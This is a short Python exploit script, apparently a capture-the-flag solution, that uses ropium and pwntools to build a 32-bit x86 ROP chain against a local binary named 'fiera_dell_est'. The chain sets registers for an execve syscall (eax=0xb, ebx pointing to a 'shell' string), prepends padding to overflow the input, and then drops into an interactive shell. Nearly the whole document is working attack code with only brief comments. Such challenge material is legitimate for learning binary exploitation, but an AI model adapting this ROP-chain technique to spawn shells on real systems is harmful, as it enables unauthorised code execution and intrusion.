"""
Exploit write in Python with ropium and pwntools.
"""

from ropium import *
from pwn import *

file_path = 'fiera_dell_est'
exe = ELF(file_path)

# Specify compile architecture of binary and ABI
rop = ROPium(ARCH.X86)
rop.abi = ABI.X86_CDECL
# Loading binary in Ropium
rop.load(file_path)

# Build ROP chain
chain = rop.compile('eax=0xb')
chain += rop.compile('ebx=' + str((exe.symbols['shell'])))
chain += rop.compile('ecx=0')
chain += rop.compile('edx=0')
chain += rop.compile(str(exe.symbols['angelo_della_morte']) + '()')  # call angelo_della_morte()

# Add padding for exploit
ropchain = b'due\x00' + b'aaaaaaaaaaaa' + chain.dump('raw')

# Executing the executable with ropchain as input
io = process([file_path])
io.recvline()
io.sendline(ropchain)
io.interactive()

